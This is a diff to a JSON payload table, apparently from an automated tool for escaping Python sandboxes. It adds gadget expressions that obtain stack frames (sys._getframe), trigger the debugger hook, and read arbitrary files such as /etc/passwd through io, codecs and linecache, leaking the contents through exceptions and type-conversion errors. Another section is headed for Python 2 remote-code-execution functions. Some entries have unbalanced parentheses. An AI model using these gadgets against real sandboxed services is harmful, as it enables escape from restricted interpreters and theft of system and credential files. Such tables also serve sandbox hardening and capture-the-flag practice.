@@ -36,7 +36,8 @@
         ["BUILTINS_SET['compile'](BUILTINS_SET['input'](),RANDOMSTRING,'eval')","BUILTINS_SET"],
         ["MODULE_BUILTINS.compile(MODULE_BUILTINS.input(),RANDOMSTRING,'eval')","MODULE_BUILTINS"],
         ["BUILTINS_SET['compile'](BUILTINS_SET['input'](),RANDOMSTRING,'single')","BUILTINS_SET"],
-        ["MODULE_BUILTINS.compile(MODULE_BUILTINS.input(),RANDOMSTRING,'single')","MODULE_BUILTINS"]
+        ["MODULE_BUILTINS.compile(MODULE_BUILTINS.input(),RANDOMSTRING,'single')","MODULE_BUILTINS"],
+        ["sys.breakpointhook()", "sys"]
     ],
     "get_user_defined_function":[
         ["def RANDOMVARNAME():RANDOMSTRING",""]
@@ -128,7 +129,8 @@
         ["(await RANDOMVARNAME for RANDOMVARNAME in ()).ag_frame",""],
         ["try:1/0\nexcept EXCEPTION_ZERODIVISIONERROR as e:e.__traceback__.tb_frame","EXCEPTION_ZERODIVISIONERROR"],
         ["try:1/0\nexcept Exception as e:e.__traceback__.tb_frame","EXCEPTION"],
-        ["async def a():pass;a().cr_frame",""]
+        ["async def a():pass;a().cr_frame",""],
+        ["sys._getframe()", "sys"]
     ],
     "type": [
         ["BUILTINOBJ.__class__.__class__",""],
@@ -195,17 +197,45 @@
         ["reprlib.Repr"],
         ["weakref.finalize"]
     ],
-    "getfilecontent":[
-        ["int(*open(CMD))","int,open"],
-        ["float(*open(CMD))","int,open"],
-        ["complex(*open(CMD))","int,open"],
-        ["exit(set(open(CMD)))","exit,set,open"],
-        ["exit(*open(CMD))","exit,open"],
-        ["open(*open(CMD))","open"],
-        ["compile('.',CMD,'exec')","compile,open"],
-        ["raise Exception(*open(CMD))","Exception,open"],
-        ["help(*open(CMD))","help,open"],
-        ["print(*open(CMD)","print,open"]
+    "filecontentstring":[
+        ["linecache.getline(COMMAND,1)", "linecache"],
+        ["FILECONTENTSIO.read()", "FILECONTENTSIO"]
+        ],
+    "filecontentsio":[
+        ["io.FileIO(COMMAND)", "io"],
+        ["io.open(COMMAND)", "io"],
+        ["io.open('/etc/passwd').buffer.raw.__class__(COMMAND)", "io"],
+        ["codecs.open(COMMAND)", "codecs"],
+        ["open(COMMAND)", "open"]
+    ],
+    "print_filecontent":[
+        ["int(*FILECONTENTSIO)", "int,FILECONTENTSIO"],
+        ["float(*FILECONTENTSIO)", "float,FILECONTENTSIO"],
+        ["complex(*FILECONTENTSIO)", "complex,FILECONTENTSIO"],
+        ["exit(set(*FILECONTENTSIO))", "exit,FILECONTENTSIO"],
+        ["exit(*FILECONTENTSIO)", "exit,FILECONTENTSIO"],
+        ["open(*FILECONTENTSIO)", "open,FILECONTENTSIO"],
+        ["help(*FILECONTENTSIO)", "help,FILECONTENTSIO"],
+        ["print(*FILECONTENTSIO)", "print,FILECONTENTSIO"],
+        ["raise Exception(*FILECONTENTSIO)", "Exception,FILECONTENTSIO"],
+        ["int(*linecache.getlines(COMMAND))", "int,linecache"],
+        ["float(*linecache.getlines(COMMAND)", "float,linecache"],
+        ["complex(*linecache.getlines(COMMAND)", "complex,linecache"],
+        ["exit(set(*linecache.getlines(COMMAND))", "exit,linecache"],
+        ["exit(*linecache.getlines(COMMAND))", "exit,linecache"],
+        ["open(*linecache.getlines(COMMAND))", "open,linecache"],
+        ["help(*linecache.getlines(COMMAND))", "help,linecache"],
+        ["print(*linecache.getlines(COMMAND))", "print,linecache"],
+        ["raise Exception(*linecache.getlines(COMMAND))", "Exception,linecache"],
+        ["int(FILECONTENTSTRING)", "int,FILECONTENTSTRING"],
+        ["float(FILECONTENTSTRING)", "float,FILECONTENTSTRING"],
+        ["complex(FILECONTENTSTRING)", "complex,FILECONTENTSTRING"],
+        ["exit(set(FILECONTENTSTRING))", "exit,FILECONTENTSTRING"],
+        ["exit(FILECONTENTSTRING)", "exit,FILECONTENTSTRING"],
+        ["open(FILECONTENTSTRING)", "open,FILECONTENTSTRING"],
+        ["help(FILECONTENTSTRING)", "help,FILECONTENTSTRING"],
+        ["print(FILECONTENTSTRING)", "print,FILECONTENTSTRING"],
+        ["raise Exception(FILECONTENTSTRING)", "Exception,FILECONTENTSTRING"]
     ],
     "python2": {
         "RCE_system_functions":[
